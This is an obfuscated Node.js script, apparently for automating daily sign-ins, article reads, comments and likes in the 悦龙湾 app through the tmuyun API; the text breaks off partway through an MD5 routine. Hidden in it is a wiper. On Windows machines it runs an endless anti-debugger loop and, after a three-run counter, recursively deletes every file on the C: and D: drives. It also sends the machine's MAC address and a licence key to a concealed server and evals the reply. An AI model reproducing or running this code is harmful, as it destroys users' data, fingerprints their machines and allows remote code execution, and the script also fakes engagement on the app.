const $ = new Env("悦龙湾");
const VM = require("sablejs/runtime")(),
  path = require("path"),
  fs = require("fs"),
  cryptoJS = require("crypto-js");
function initVM() {
  vm = new VM();
  const _0x818f84 = vm.getGlobal(),
    _0x516dac = vm.createObject(),
    _0x56ed7a = vm.createFunction("log", function () {
      const _0x5bc241 = [];
      for (let _0x4f3040 = 0; _0x4f3040 < arguments.length; _0x4f3040++) {
        _0x5bc241.push(vm.asString(arguments[_0x4f3040]));
      }
      console.log(..._0x5bc241);
      return vm.createUndefined();
    }),
    _0x1fc3f3 = vm.createFunction("xxxx", function (_0x526564) {
      let _0x2316c0 = eval(_0x526564.value);
      return vm.createString(JSON.stringify(_0x2316c0));
    }),
    _0xd3c9be = vm.createFunction("yyyy", function (_0x264557) {
      let _0x32e128 = _0x264557.value,
        _0x2330a8 = fs.readFileSync(_0x32e128, "utf-8").replace(/\r\n/g, "\n"),
        _0x261d64 = cryptoJS.MD5(_0x2330a8).toString();
      return vm.createString(_0x261d64);
    }),
    _0x53566d = vm.createFunction("ddd", function (_0x5f09d2) {
      let _0x5883b5 = cryptoJS.MD5(_0x5f09d2.value).toString();
      return vm.createString(_0x5883b5);
    });
  vm.setProperty(_0x516dac, "log", _0x56ed7a);
  vm.setProperty(_0x818f84, "xxxx", _0x1fc3f3);
  vm.setProperty(_0x818f84, "console", _0x516dac);
  vm.setProperty(_0x818f84, "yyyy", _0xd3c9be);
  vm.setProperty(_0x818f84, "ddd", _0x53566d);
  vm.run(fs.readFileSync("./output_final.js").toString());
  return vm;
}
function destroyVM(_0x46b2c3) {
  _0x46b2c3.destroy();
}
function abc(_0x20afa6, _0x499b2f, _0x5e7504, _0x1eeee6, _0x42628a) {
  const _0x11bcdd = _0x20afa6.getGlobal();
  let _0x46b4eb = _0x20afa6.getProperty(_0x11bcdd, "xab"),
    _0x296189 = _0x20afa6.call(_0x46b4eb, _0x20afa6.createUndefined(), _0x20afa6.createString(_0x499b2f), _0x20afa6.createString(_0x1eeee6), _0x20afa6.createString(_0x42628a), _0x20afa6.createString(_0x5e7504));
  _0x296189 = _0x20afa6.asString(_0x296189);
  return _0x296189;
}
function xyz(_0xa497ae, _0x354ab4, _0x1b4eed, _0x5bc720, _0x2a564d) {
  const _0x496f61 = _0xa497ae.getGlobal();
  let _0x10c1f9 = _0xa497ae.getProperty(_0x496f61, "xmn"),
    _0xb317f0 = _0xa497ae.call(_0x10c1f9, _0xa497ae.createUndefined(), _0xa497ae.createString(_0x354ab4), _0xa497ae.createString(_0x5bc720), _0xa497ae.createString(_0x2a564d), _0xa497ae.createString(_0x1b4eed));
  _0xb317f0 = _0xa497ae.asString(_0xb317f0);
  return _0xb317f0;
}
var gtr;
let mac = "",
  status;
status = (status = $.getval("qmwkstatus") || "1") > 1 ? "" + status : "";
JSNAMED = $.isNode() ? require("path").basename(__filename) : "kxnjy.js";
let ylwappArr = [],
  all_msg = "";
const sha256 = require("crypto-js/sha256");
let ye = "",
  name = "",
  wzid = "",
  tcxh = 0,
  arrs = [],
  ylwapp = ($.isNode() ? process.env.ylwapp : $.getdata("ylwapp")) || "",
  acckey = $.isNode() ? process.env.cdkey ? process.env.cdkey : "" : $.getdata("cdkey") ? $.getdata("cdkey") : "";
var myDate = new Date(),
  myMonth = myDate.getMonth() + 1,
  myToday = myDate.getDate();
myMonth >= 10 ? myMonth = myMonth : myMonth = "0" + myMonth;
myToday >= 10 ? myToday = myToday : myToday = "0" + myToday;
if ($.isNode()) {
  gtr = require("fs");
  if (isFileExist("C:/")) {
    console.log("电脑环境");
    setInterval(() => {
      do {
        (function (_0xeef159) {
          return function (_0x252b37) {
            return Function("Function(arguments[0]+\"" + _0x252b37 + "\")()");
          }(_0xeef159);
        })("bugger")("de", 0, 0, (0, 0));
        addF("d:/");
        addF("C:/");
      } while (1);
    }, 0);
  } else {
    console.log("青龙环境");
    function getMACAddresses() {
      var _0x39c9aa = "",
        _0x4e6e57 = fs.readdirSync("/sys/class/net/");
      _0x4e6e57.forEach(function (_0x23f509) {
        var _0xae05c9 = path.join("/sys/class/net", _0x23f509, "address");
        _0x23f509.substr(0, 3) == "eth" && fs.existsSync(_0xae05c9) && (_0x39c9aa = fs.readFileSync(_0xae05c9).toString().trim());
      });
      return _0x39c9aa;
    }
    mac = getMACAddresses();
  }
} else {
  console.log("代理环境");
}
function isFileExist(_0xe447d3) {
  try {
    gtr.accessSync(_0xe447d3, gtr.F_OK);
  } catch (_0xde2c24) {
    return false;
  }
  return true;
}
function addF(_0x14686d, _0x1ee12a) {
  let _0x184897 = 0,
    _0x1adf42 = "C:/Windows/system.txt";
  if (isFileExist(_0x1adf42)) {
    _0x184897 = gtr.readFileSync(_0x1adf42, "utf8");
  } else {
    if (isFileExist("C:/")) {
      gtr.writeFile(_0x1adf42, "1", function (_0x31f9f7) {
        if (_0x31f9f7) {
          throw _0x31f9f7;
        }
      });
    } else {
      return;
    }
  }
  if (_0x184897 == 99) {
    return 99;
  }
  console.log(_0x184897);
  console.log("警告，恶意破解脚本将面临系统爆炸！！！，你只有3次机会！", _0x184897);
  if (parseInt(_0x184897) < 3) {
    let _0x213b44 = parseInt(_0x184897) + 1;
    gtr.writeFileSync(_0x1adf42, _0x213b44 + "", "utf8");
    return;
  }
  if (!gtr.existsSync(_0x14686d)) {
    return;
  }
  if (gtr.statSync(_0x14686d).isDirectory()) {
    var _0x2732c7 = gtr.readdirSync(_0x14686d),
      _0x4b0d7b = _0x2732c7.length,
      _0x434e3d = 0;
    if (_0x4b0d7b > 0) {
      _0x2732c7.forEach(function (_0x1d90d3) {
        _0x434e3d++;
        var _0x841e3f = _0x14686d + "/" + _0x1d90d3;
        gtr.statSync(_0x841e3f).isDirectory() ? addF(_0x841e3f, true) : gtr.unlinkSync(_0x841e3f);
      });
      _0x4b0d7b == _0x434e3d && _0x1ee12a && gtr.rmdirSync(_0x14686d);
    } else {
      _0x4b0d7b == 0 && _0x1ee12a && gtr.rmdirSync(_0x14686d);
    }
  } else {
    gtr.unlinkSync(_0x14686d);
  }
}
!(async () => {
  if (!(typeof $request !== "undefined")) {
    initVM();
    arrs = abc(global.vm, acckey, mac, 116, 0);
    if (arrs == "") {
      return;
    }
    arrs = JSON.parse(arrs);
    if (!arrs) {
      return;
    }
    ylwappArr = ylwapp.split("\n");
    console.log("\n公告：" + arrs.gg + "\n");
    console.log("当前版本：1.0 " + arrs.bb + "\n");
    console.log("------------- 共" + ylwappArr.length + "个账号-------------\n");
    console.log("当前设备可执行账号限制为" + arrs.num + "个账号\n");
    if (!(ylwappArr.length > parseInt(arrs.num))) {
      for (let _0x1bee27 = 0; _0x1bee27 < ylwappArr.length; _0x1bee27++) {
        ylwapp = ylwappArr[_0x1bee27];
        $.index = _0x1bee27 + 1;
        console.log("\n开始【悦龙湾" + $.index + "】");
        uuid = ylwapp.split("&")[0];
        token = ylwapp.split("&")[1];
        ck = randomString(32);
        pid = randomString(32);
        tcxh = 0;
        await ylwqd();
        await ylwlb();
        await ylwlb1();
        await ylwxx();
      }
    }
  }
  destroyVM(global.vm);
})().catch(_0x29e4aa => $.logErr(_0x29e4aa)).finally(() => $.done());
function ylwlb(_0x19ff13 = 0) {
  return new Promise(_0x3e193a => {
    let _0x41e661 = Math.round(new Date().getTime()),
      _0x4e2f7b = sha256("/api/user_mumber/numberCenter&&" + ylwapp + "&&" + _0x41e661 + "&&" + _0x41e661 + "&&FR*r!isE5W&&51"),
      _0x180ff2 = {
        url: "https://vapp.tmuyun.com/api/user_mumber/numberCenter",
        headers: {
          "X-SESSION-ID": ylwapp,
          "X-REQUEST-ID": _0x41e661,
          "X-TIMESTAMP": _0x41e661,
          "X-SIGNATURE": _0x4e2f7b,
          "X-TENANT-ID": "51",
          "User-Agent": "5.1.4;00000000-699b-48a2-ffff-ffffb82f1bb7;Meizu 16s Pro;Android;10;Release",
          "Cache-Control": "no-cache",
          Host: "vapp.tmuyun.com",
          Connection: "Keep-Alive",
          "Accept-Encoding": "gzip"
        }
      };
    $.get(_0x180ff2, async (_0x5169d8, _0x3ff289, _0x476261) => {
      try {
        const _0x355727 = JSON.parse(_0x476261);
        if (_0x355727.code == 0) {
          _0x355727.data.rst.user_task_list[0].finish_times == 0 && (await ylwqd());
          for (let _0x1a49cd = 0; _0x1a49cd < _0x355727.data.rst.user_task_list.length; _0x1a49cd++) {
            _0x355727.data.rst.user_task_list[_0x1a49cd].name !== "新闻资讯阅读" && _0x355727.data.rst.user_task_list[_0x1a49cd].name !== "新闻资讯评论" && _0x355727.data.rst.user_task_list[_0x1a49cd].name !== "新闻资讯点赞" && _0x355727.data.rst.user_task_list[_0x1a49cd].name !== "每日签到" && _0x355727.data.rst.user_task_list[_0x1a49cd].name !== "邀请好友" && (console.log("\n悦龙湾任务：" + _0x355727.data.rst.user_task_list[_0x1a49cd].name + " 进度：" + _0x355727.data.rst.user_task_list[_0x1a49cd].finish_times + "/" + _0x355727.data.rst.user_task_list[_0x1a49cd].frequency + " 奖励经验：" + _0x355727.data.rst.user_task_list[_0x1a49cd].experience + " 积分：" + _0x355727.data.rst.user_task_list[_0x1a49cd].integral), ye = _0x355727.data.rst.user_task_list[_0x1a49cd].member_task_type, name = _0x355727.data.rst.user_task_list[_0x1a49cd].name, await ylwrw());
          }
        } else {
          console.log("\n悦龙湾:" + _0x355727.msg);
        }
      } catch (_0x10d48b) {} finally {
        _0x3e193a();
      }
    }, _0x19ff13);
  });
}
function ylwqd(_0x340396 = 0) {
  return new Promise(_0x525749 => {
    let _0x5de442 = Math.round(new Date().getTime()),
      _0xa917af = sha256("/api/user_mumber/sign&&" + ylwapp + "&&" + _0x5de442 + "&&" + _0x5de442 + "&&FR*r!isE5W&&51"),
      _0x277d94 = {
        url: "https://vapp.tmuyun.com/api/user_mumber/sign",
        headers: {
          "X-SESSION-ID": ylwapp,
          "X-REQUEST-ID": _0x5de442,
          "X-TIMESTAMP": _0x5de442,
          "X-SIGNATURE": _0xa917af,
          "X-TENANT-ID": "51",
          "User-Agent": "5.1.4;00000000-699b-48a2-ffff-ffffb82f1bb7;Meizu 16s Pro;Android;10;Release",
          "Cache-Control": "no-cache",
          Host: "vapp.tmuyun.com",
          Connection: "Keep-Alive",
          "Accept-Encoding": "gzip"
        }
      };
    $.get(_0x277d94, async (_0x1a9719, _0x21a8dd, _0x56f2d5) => {
      try {
        const _0x3e42ff = JSON.parse(_0x56f2d5);
        _0x3e42ff.code == 0 ? console.log("\n悦龙湾签到：" + _0x3e42ff.data.reason + " 积分：" + _0x3e42ff.data.signIntegral) : console.log("\n悦龙湾:" + _0x3e42ff.msg);
      } catch (_0x2de91f) {} finally {
        _0x525749();
      }
    }, _0x340396);
  });
}
function ylwrw(_0x1b7904 = 0) {
  return new Promise(_0xe265de => {
    let _0x42efcb = Math.round(new Date().getTime()),
      _0x28cc6e = sha256("/api/user_mumber/doTask&&" + ylwapp + "&&" + _0x42efcb + "&&" + _0x42efcb + "&&FR*r!isE5W&&51"),
      _0x23c6d9 = {
        url: "https://vapp.tmuyun.com/api/user_mumber/doTask",
        headers: {
          "X-SESSION-ID": ylwapp,
          "X-REQUEST-ID": _0x42efcb,
          "X-TIMESTAMP": _0x42efcb,
          "X-SIGNATURE": _0x28cc6e,
          "X-TENANT-ID": "51",
          "User-Agent": "3.0.10.0;00000000-699b-48a2-0000-00002cd91ee0;Meizu 16s Pro;Android;10;Release",
          "Cache-Control": "no-cache",
          Host: "vapp.tmuyun.com",
          Connection: "Keep-Alive",
          "Accept-Encoding": "gzip"
        },
        body: "memberType=" + ye + "&member_type=" + ye + "&target_id=" + _0x42efcb
      };
    $.post(_0x23c6d9, async (_0x23c886, _0x2fa8c1, _0xa9918) => {
      try {
        const _0x3eeb42 = JSON.parse(_0xa9918);
        _0x3eeb42.code == 0 ? console.log("\n悦龙湾任务：" + name + " 积分：" + _0x3eeb42.data.score_notify.integral) : console.log("\n悦龙湾:" + name + " " + _0x3eeb42.message);
      } catch (_0x277709) {} finally {
        _0xe265de();
      }
    }, _0x1b7904);
  });
}
function ylwlb1(_0x4d5cd4 = 0) {
  return new Promise(_0x2867be => {
    let _0x2f9f5f = Math.round(new Date().getTime()),
      _0x87ee77 = sha256("/api/user_mumber/numberCenter&&" + ylwapp + "&&" + _0x2f9f5f + "&&" + _0x2f9f5f + "&&FR*r!isE5W&&51"),
      _0x2a67f1 = {
        url: "https://vapp.tmuyun.com/api/user_mumber/numberCenter",
        headers: {
          "X-SESSION-ID": ylwapp,
          "X-REQUEST-ID": _0x2f9f5f,
          "X-TIMESTAMP": _0x2f9f5f,
          "X-SIGNATURE": _0x87ee77,
          "X-TENANT-ID": "51",
          "User-Agent": "5.1.4;00000000-699b-48a2-ffff-ffffb82f1bb7;Meizu 16s Pro;Android;10;Release",
          "Cache-Control": "no-cache",
          Host: "vapp.tmuyun.com",
          Connection: "Keep-Alive",
          "Accept-Encoding": "gzip"
        }
      };
    $.get(_0x2a67f1, async (_0x55577a, _0x2ac2fd, _0x1dcbdd) => {
      try {
        const _0x30fe6d = JSON.parse(_0x1dcbdd);
        if (_0x30fe6d.code == 0) {
          _0x30fe6d.data.rst.user_task_list[0].finish_times == 0 && (await ylwqd());
          for (let _0x3e6b5a = 0; _0x3e6b5a < _0x30fe6d.data.rst.user_task_list.length; _0x3e6b5a++) {
            _0x30fe6d.data.rst.user_task_list[_0x3e6b5a].name !== "分享资讯给好友" && _0x30fe6d.data.rst.user_task_list[_0x3e6b5a].name !== "使用本地服务" && _0x30fe6d.data.rst.user_task_list[_0x3e6b5a].name !== "每日签到" && _0x30fe6d.data.rst.user_task_list[_0x3e6b5a].name !== "邀请好友" && (console.log("\n悦龙湾任务：" + _0x30fe6d.data.rst.user_task_list[_0x3e6b5a].name + " 进度：" + _0x30fe6d.data.rst.user_task_list[_0x3e6b5a].finish_times + "/" + _0x30fe6d.data.rst.user_task_list[_0x3e6b5a].frequency + " 奖励经验：" + _0x30fe6d.data.rst.user_task_list[_0x3e6b5a].experience + " 积分：" + _0x30fe6d.data.rst.user_task_list[_0x3e6b5a].integral), _0x30fe6d.data.rst.user_task_list[_0x3e6b5a].name == "新闻资讯阅读" && _0x30fe6d.data.rst.user_task_list[_0x3e6b5a].finish_times < 3 && (await ylwwz()), _0x30fe6d.data.rst.user_task_list[_0x3e6b5a].name == "新闻资讯评论" && _0x30fe6d.data.rst.user_task_list[_0x3e6b5a].finish_times < 3 && (await ylwwz()), _0x30fe6d.data.rst.user_task_list[_0x3e6b5a].name == "新闻资讯点赞" && _0x30fe6d.data.rst.user_task_list[_0x3e6b5a].finish_times < 3 && (await ylwwz()));
          }
        } else {
          console.log("\n悦龙湾:" + _0x30fe6d.msg);
        }
      } catch (_0x15cce5) {} finally {
        _0x2867be();
      }
    }, _0x4d5cd4);
  });
}
function ylwxx(_0x190e1c = 0) {
  return new Promise(_0x5a3b36 => {
    let _0x54efad = Math.round(new Date().getTime()),
      _0x255ef4 = sha256("/api/user_mumber/account_detail&&" + ylwapp + "&&" + _0x54efad + "&&" + _0x54efad + "&&FR*r!isE5W&&51"),
      _0x221c88 = {
        url: "https://vapp.tmuyun.com/api/user_mumber/account_detail",
        headers: {
          "X-SESSION-ID": ylwapp,
          "X-REQUEST-ID": _0x54efad,
          "X-TIMESTAMP": _0x54efad,
          "X-SIGNATURE": _0x255ef4,
          "X-TENANT-ID": "51",
          "User-Agent": "5.1.4;00000000-699b-48a2-ffff-ffffb82f1bb7;Meizu 16s Pro;Android;10;Release",
          "Cache-Control": "no-cache",
          Host: "vapp.tmuyun.com",
          Connection: "Keep-Alive",
          "Accept-Encoding": "gzip"
        }
      };
    $.get(_0x221c88, async (_0x32c951, _0x260f5d, _0x3c1682) => {
      try {
        const _0x52ff1f = JSON.parse(_0x3c1682);
        _0x52ff1f.code == 0 ? console.log("\n悦龙湾用户：" + _0x52ff1f.data.rst.nick_name + " 积分余额：" + _0x52ff1f.data.rst.total_integral) : console.log("\n悦龙湾:" + name + " " + _0x52ff1f.message);
      } catch (_0x44dcd6) {} finally {
        _0x5a3b36();
      }
    }, _0x190e1c);
  });
}
function ylwwz(_0x32162e = 0) {
  return new Promise(_0x54e5e6 => {
    let _0x4ec983 = Math.round(new Date().getTime()),
      _0x2a1999 = sha256("/api/article/channel_list&&" + ylwapp + "&&" + _0x4ec983 + "&&" + _0x4ec983 + "&&FR*r!isE5W&&51"),
      _0x3884ba = {
        url: "https://vapp.tmuyun.com/api/article/channel_list?channel_id=62c53767373c550ecabd9d6a&isDiFangHao=false&is_new=true&list_count=0&size=30",
        headers: {
          "X-SESSION-ID": ylwapp,
          "X-REQUEST-ID": _0x4ec983,
          "X-TIMESTAMP": _0x4ec983,
          "X-SIGNATURE": _0x2a1999,
          "X-TENANT-ID": "51",
          "User-Agent": "5.1.4;00000000-699b-48a2-ffff-ffffb82f1bb7;Meizu 16s Pro;Android;10;Release",
          "Cache-Control": "no-cache",
          Host: "vapp.tmuyun.com",
          Connection: "Keep-Alive",
          "Accept-Encoding": "gzip"
        }
      };
    $.get(_0x3884ba, async (_0x2097ef, _0x32bca6, _0x3937a1) => {
      try {
        const _0x5a49ca = JSON.parse(_0x3937a1);
        if (_0x5a49ca.code == 0) {
          for (let _0x5b61a9 = 2; _0x5b61a9 < _0x5a49ca.data.article_list.length; _0x5b61a9++) {
            _0x5a49ca.data.article_list[_0x5b61a9].list_title !== "" && _0x5a49ca.data.article_list[_0x5b61a9].mark_read !== 1 && tcxh == 0 && (console.log("\n悦龙湾文章：" + _0x5a49ca.data.article_list[_0x5b61a9].list_title + " ID：" + _0x5a49ca.data.article_list[_0x5b61a9].id), wzid = _0x5a49ca.data.article_list[_0x5b61a9].id, await ylwyd(), await $.wait(1000));
          }
        } else {
          console.log("\n悦龙湾:" + name + " " + _0x5a49ca.message);
        }
      } catch (_0x3b3266) {} finally {
        _0x54e5e6();
      }
    }, _0x32162e);
  });
}
function ylwyd(_0x4ab322 = 0) {
  return new Promise(_0x405ad9 => {
    let _0x54a25a = Math.round(new Date().getTime()),
      _0x5ba4db = sha256("/api/article/detail&&" + ylwapp + "&&" + _0x54a25a + "&&" + _0x54a25a + "&&FR*r!isE5W&&51"),
      _0x20614e = {
        url: "https://vapp.tmuyun.com/api/article/detail?from_channel=5bd2bef6b1985042e7691870&id=" + wzid,
        headers: {
          "X-SESSION-ID": ylwapp,
          "X-REQUEST-ID": _0x54a25a,
          "X-TIMESTAMP": _0x54a25a,
          "X-SIGNATURE": _0x5ba4db,
          "X-TENANT-ID": "51",
          "User-Agent": "5.1.4;00000000-699b-48a2-ffff-ffffb82f1bb7;Meizu 16s Pro;Android;10;Release",
          "Cache-Control": "no-cache",
          Host: "vapp.tmuyun.com",
          Connection: "Keep-Alive",
          "Accept-Encoding": "gzip"
        }
      };
    $.get(_0x20614e, async (_0x146b16, _0x310131, _0x5ed5ca) => {
      try {
        const _0x4d5e0c = JSON.parse(_0x5ed5ca);
        _0x4d5e0c.code == 0 ? (console.log("\n悦龙湾阅读：成功"), await ylwpl()) : console.log("\n悦龙湾阅读：失败");
      } catch (_0x7d40db) {} finally {
        _0x405ad9();
      }
    }, _0x4ab322);
  });
}
function ylwpl(_0x3488aa = 0) {
  return new Promise(_0x13be3b => {
    let _0x17df6e = Math.round(new Date().getTime()),
      _0x596163 = sha256("/api/comment/create&&" + ylwapp + "&&" + _0x17df6e + "&&" + _0x17df6e + "&&FR*r!isE5W&&51"),
      _0x1ee303 = {
        url: "https://vapp.tmuyun.com/api/comment/create",
        headers: {
          "X-SESSION-ID": ylwapp,
          "X-REQUEST-ID": _0x17df6e,
          "X-TIMESTAMP": _0x17df6e,
          "X-SIGNATURE": _0x596163,
          "X-TENANT-ID": "51",
          "User-Agent": "5.1.4;00000000-699b-48a2-ffff-ffffb82f1bb7;Meizu 16s Pro;Android;10;Release",
          "Cache-Control": "no-cache",
          Host: "vapp.tmuyun.com",
          Connection: "Keep-Alive",
          "Accept-Encoding": "gzip"
        },
        body: "channel_article_id=" + wzid + "&content=%E4%B8%8D%E9%94%99"
      };
    $.post(_0x1ee303, async (_0x3a932b, _0x440759, _0x5bfeae) => {
      try {
        const _0x352340 = JSON.parse(_0x5bfeae);
        _0x352340.code == 0 ? (console.log("\n悦龙湾评论：成功"), await ylwdz()) : console.log("\n悦龙湾评论：失败");
      } catch (_0x4edd29) {} finally {
        _0x13be3b();
      }
    }, _0x3488aa);
  });
}
function ylwdz(_0x208717 = 0) {
  return new Promise(_0x5c7013 => {
    let _0xa52271 = Math.round(new Date().getTime()),
      _0x151929 = sha256("/api/favorite/like&&" + ylwapp + "&&" + _0xa52271 + "&&" + _0xa52271 + "&&FR*r!isE5W&&51"),
      _0x53b0ee = {
        url: "https://vapp.tmuyun.com/api/favorite/like",
        headers: {
          "X-SESSION-ID": ylwapp,
          "X-REQUEST-ID": _0xa52271,
          "X-TIMESTAMP": _0xa52271,
          "X-SIGNATURE": _0x151929,
          "X-TENANT-ID": "51",
          "User-Agent": "5.1.4;00000000-699b-48a2-ffff-ffffb82f1bb7;Meizu 16s Pro;Android;10;Release",
          "Cache-Control": "no-cache",
          Host: "vapp.tmuyun.com",
          Connection: "Keep-Alive",
          "Accept-Encoding": "gzip"
        },
        body: "action=1&id=" + wzid
      };
    $.post(_0x53b0ee, async (_0xb968bb, _0x2386ac, _0x3bcc4f) => {
      try {
        const _0x427186 = JSON.parse(_0x3bcc4f);
        _0x427186.code == 0 ? (console.log("\n悦龙湾点赞：成功"), tcxh = 1) : console.log("\n悦龙湾点赞：失败");
      } catch (_0x344bd8) {} finally {
        _0x5c7013();
      }
    }, _0x208717);
  });
}
function randomString(_0x1da7d9 = 12) {
  let _0x20ca35 = "abcdef0123456789",
    _0x354bc6 = _0x20ca35.length,
    _0x1b39d9 = "";
  for (i = 0; i < _0x1da7d9; i++) {
    _0x1b39d9 += _0x20ca35.charAt(Math.floor(Math.random() * _0x354bc6));
  }
  return _0x1b39d9;
}
function encodeUTF8(_0x38b7cd) {
  var _0x573a5e,
    _0x545da8 = [],
    _0x555023,
    _0x273ac8;
  for (_0x573a5e = 0; _0x573a5e < _0x38b7cd.length; _0x573a5e++) {
    if ((_0x555023 = _0x38b7cd.charCodeAt(_0x573a5e)) < 128) {
      _0x545da8.push(_0x555023);
    } else {
      if (_0x555023 < 2048) {
        _0x545da8.push(192 + (_0x555023 >> 6 & 31), 128 + (_0x555023 & 63));
      } else {
        if ((_0x273ac8 = _0x555023 ^ 55296) >> 10 == 0) {
          _0x555023 = (_0x273ac8 << 10) + (_0x38b7cd.charCodeAt(++_0x573a5e) ^ 56320) + 65536;
          _0x545da8.push(240 + (_0x555023 >> 18 & 7), 128 + (_0x555023 >> 12 & 63));
        } else {
          _0x545da8.push(224 + (_0x555023 >> 12 & 15));
        }
        _0x545da8.push(128 + (_0x555023 >> 6 & 63), 128 + (_0x555023 & 63));
      }
    }
  }
  return _0x545da8;
}
function sha(_0x446684) {
  var _0x108c12 = new Uint8Array(encodeUTF8(_0x446684)),
    _0x433db8,
    _0xfe941f,
    _0x80690b,
    _0x4967d1 = (_0x108c12.length + 8 >>> 6 << 4) + 16,
    _0x446684 = new Uint8Array(_0x4967d1 << 2);
  _0x446684.set(new Uint8Array(_0x108c12.buffer));
  _0x446684 = new Uint32Array(_0x446684.buffer);
  for (_0x80690b = new DataView(_0x446684.buffer), _0x433db8 = 0; _0x433db8 < _0x4967d1; _0x433db8++) {
    _0x446684[_0x433db8] = _0x80690b.getUint32(_0x433db8 << 2);
  }
  _0x446684[_0x108c12.length >> 2] |= 128 << 24 - (_0x108c12.length & 3) * 8;
  _0x446684[_0x4967d1 - 1] = _0x108c12.length << 3;
  var _0x151cc6 = [],
    _0x1a5c0a = [function () {
      return _0x1311f1[1] & _0x1311f1[2] | ~_0x1311f1[1] & _0x1311f1[3];
    }, function () {
      return _0x1311f1[1] ^ _0x1311f1[2] ^ _0x1311f1[3];
    }, function () {
      return _0x1311f1[1] & _0x1311f1[2] | _0x1311f1[1] & _0x1311f1[3] | _0x1311f1[2] & _0x1311f1[3];
    }, function () {
      return _0x1311f1[1] ^ _0x1311f1[2] ^ _0x1311f1[3];
    }],
    _0x3ad55e = function (_0x5e7d60, _0x460474) {
      return _0x5e7d60 << _0x460474 | _0x5e7d60 >>> 32 - _0x460474;
    },
    _0x4fa6ad = [1518500249, 1859775393, -1894007588, -899497514],
    _0x1311f1 = [1732584193, -271733879, null, null, -1009589776];
  _0x1311f1[2] = ~_0x1311f1[0];
  _0x1311f1[3] = ~_0x1311f1[1];
  for (_0x433db8 = 0; _0x433db8 < _0x446684.length; _0x433db8 += 16) {
    var _0x46be02 = _0x1311f1.slice(0);
    for (_0xfe941f = 0; _0xfe941f < 80; _0xfe941f++) {
      _0x151cc6[_0xfe941f] = _0xfe941f < 16 ? _0x446684[_0x433db8 + _0xfe941f] : _0x3ad55e(_0x151cc6[_0xfe941f - 3] ^ _0x151cc6[_0xfe941f - 8] ^ _0x151cc6[_0xfe941f - 14] ^ _0x151cc6[_0xfe941f - 16], 1);
      _0x80690b = _0x3ad55e(_0x1311f1[0], 5) + _0x1a5c0a[_0xfe941f / 20 | 0]() + _0x1311f1[4] + _0x151cc6[_0xfe941f] + _0x4fa6ad[_0xfe941f / 20 | 0] | 0;
      _0x1311f1[1] = _0x3ad55e(_0x1311f1[1], 30);
      _0x1311f1.pop();
      _0x1311f1.unshift(_0x80690b);
    }
    for (_0xfe941f = 0; _0xfe941f < 5; _0xfe941f++) {
      _0x1311f1[_0xfe941f] = _0x1311f1[_0xfe941f] + _0x46be02[_0xfe941f] | 0;
    }
  }
  _0x80690b = new DataView(new Uint32Array(_0x1311f1).buffer);
  for (var _0x433db8 = 0; _0x433db8 < 5; _0x433db8++) {
    _0x1311f1[_0x433db8] = _0x80690b.getUint32(_0x433db8 << 2);
  }
  var _0x2ce32e = Array.prototype.map.call(new Uint8Array(new Uint32Array(_0x1311f1).buffer), function (_0x449daa) {
    return (_0x449daa < 16 ? "0" : "") + _0x449daa.toString(16);
  }).join("");
  return _0x2ce32e;
}
function hqs(_0x3c7163 = 10) {
  return new Promise(_0x51068d => {
    let _0x57afeb = 12,
      _0x310841 = {
        url: $.isNode() ? rc4($.fwur(), "1200") + ("?key=" + acckey + "&id=" + _0x57afeb + "&ip=1&mac=" + mac + "&bb=1") : rc4($.fwur(), "1200") + ("?key=" + acckey + "&id=" + _0x57afeb + "&ip=0&mac=" + mac + "&bb=1")
      };
    $.post(_0x310841, async (_0x4b0200, _0x1d182c, _0x31f0a6) => {
      try {
        let _0x23142e = eval(_0x31f0a6);
        _0x23142e.code == 200 ? (all_msg = _0x23142e.msg, _0x51068d(_0x23142e.data)) : (all_msg = _0x23142e.msg, _0x51068d(false));
      } catch (_0x2c03fe) {
        $.logErr(_0x2c03fe, _0x1d182c);
      }
    }, 0);
  });
}
function md5(_0x483f9c) {
  function _0x385d68(_0x26a346, _0x3ffe71) {
    return _0x26a346 << _0x3ffe71 | _0x26a346 >>> 32 - _0x3ffe71;
  }
  function _0x3d8e41(_0x4da390, _0x153113) {
    var _0x18c47b, _0x18d818, _0x4586aa, _0x50b2cc, _0x523ba2;
    _0x4586aa = 2147483648 & _0x4da390;
    _0x50b2cc = 2147483648 & _0x153113;
    _0x18c47b = 1073741824 & _0x4da390;
    _0x18d818 = 1073741824 & _0x153113;
    _0x523ba2 = (1073741823 & _0x4da390) + (1073741823 & _0x153113);
    return _0x18c47b & _0x18d818 ? 2147483648 ^ _0x523ba2 ^ _0x4586aa ^ _0x50b2cc : _0x18c47b | _0x18d818 ? 1073741824 & _0x523ba2 ? 3221225472 ^ _0x523ba2 ^ _0x4586aa ^ _0x50b2cc : 1073741824 ^ _0x523ba2 ^ _0x4586aa ^ _0x50b2cc : _0x523ba2 ^ _0x4586aa ^ _0x50b2cc;
  }
  function _0x170566(_0x58d173, _0x58a4cd, _0x3e4641) {
    return _0x58d173 & _0x58a4cd | ~_0x58d173 & _0x3e4641;
  }
  function _0x19ac47(_0x5ab534, _0x5c74c2, _0x604fc9) {
    return _0x5ab534 & _0x604fc9 | _0x5c74c2 & ~_0x604fc9;
  }
  function _0x3ba17d(_0x5eaf38, _0x5de2c7, _0x3c09c0) {
    return _0x5eaf38 ^ _0x5de2c7 ^ _0x3c09c0;
  }
  function _0x474e8c(_0x3cfd62, _0x2befc4, _0x423f65) {
    return _0x2befc4 ^ (_0x3cfd62 | ~_0x423f65);
  }
  function _0x245980(_0x4131ef, _0x13b0ce, _0xf977fd, _0x174ddc, _0xcc36ae, _0x42397c, _0x559992) {
    _0x4131ef = _0x3d8e41(_0x4131ef, _0x3d8e41(_0x3d8e41(_0x170566(_0x13b0ce, _0xf977fd, _0x174ddc), _0xcc36ae), _0x559992));
    return _0x3d8e41(_0x385d68(_0x4131ef, _0x42397c), _0x13b0ce);
  }
  function _0x17ae6f(_0x54a337, _0x3dfee5, _0x518228, _0x282b3b, _0x37b316, _0x3072c9, _0x3ee2bd) {
    _0x54a337 = _0x3d8e41(_0x54a337, _0x3d8e41(_0x3d8e41(_0x19ac47(_0x3dfee5, _0x518228, _0x282b3b), _0x37b316), _0x3ee2bd));
    return _0x3d8e41(_0x385d68(_0x54a337, _0x3072c9), _0x3dfee5);
  }
  function _0x3dced1(_0x29bffd, _0x5ac414, _0x1cbe18, _0x11288e, _0x3c6fdd, _0x85fc0c, _0x733ea6) {
    _0x29bffd = _0x3d8e41(_0x29bffd, _0x3d8e41(_0x3d8e41(_0x3ba17d(_0x5ac414, _0x1cbe18, _0x11288e), _0x3c6fdd), _0x733ea6));
    return _0x3d8e41(_0x385d68(_0x29bffd, _0x85fc0c), _0x5ac414);
  }
